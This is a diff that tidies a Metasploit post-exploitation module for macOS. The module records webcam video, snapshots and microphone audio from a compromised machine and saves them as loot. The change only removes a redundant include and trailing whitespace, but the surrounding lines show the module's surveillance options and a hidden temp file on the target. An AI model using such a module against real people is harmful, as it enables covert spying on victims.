@@ -7,10 +7,8 @@
 
 require 'msf/core'
 require 'shellwords'
-require 'msf/core/post/osx/ruby_dl'
 
 class Metasploit3 < Msf::Post
-  include Msf::Post::Common
   include Msf::Post::File
   include Msf::Auxiliary::Report
   include Msf::Post::OSX::RubyDL
@@ -42,7 +40,7 @@ class Metasploit3 < Msf::Post
         OptInt.new('CAMERA_INDEX', [true, 'The index of the webcam to use. `set ACTION LIST` to get a list.', 0]),
         OptInt.new('MIC_INDEX', [true, 'The index of the mic to use. `set ACTION LIST` to get a list.', 0]),
         OptString.new('JPG_QUALITY', [false, 'The compression factor for snapshotting a jpg (from 0 to 1)', "0.8"]),
-        OptString.new('TMP_FILE', 
+        OptString.new('TMP_FILE',
           [true, 'The tmp file to use on the remote machine', '/tmp/.<random>/<random>']
         ),
         OptBool.new('AUDIO_ENABLED', [false, 'Enable audio when recording', true]),
@@ -108,7 +106,7 @@ class Metasploit3 < Msf::Post
                 tmp_file = File.join(File.dirname(tmp_file), base+num+'.'+ext)
                 # store contents in file
                 title = "OSX Webcam Recording "+i.to_s
-                f = store_loot(title, "video/mov", session, contents, 
+                f = store_loot(title, "video/mov", session, contents,
                   "osx_webcam_rec#{i}.mov", title)
                 print_good "Record file captured and saved to #{f}"
                 print_status "Rolling movie file. "
